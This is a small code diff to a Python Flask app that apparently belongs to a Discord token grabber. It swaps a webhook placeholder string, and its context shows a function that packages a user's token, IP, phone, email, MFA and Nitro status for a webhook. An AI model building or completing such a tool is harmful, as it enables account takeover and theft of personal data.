@@ -3,7 +3,7 @@ from dhooks import Webhook, Embed
 import requests
 
 app = Flask(__name__)
-hook = Webhook('change yo webhook')
+hook = Webhook('YOUR WEBHOOK')
 
 
 def send_black_embed(token, ip, phone_number, email, username, tag, avatar_url, mfa_status, nitro_status):
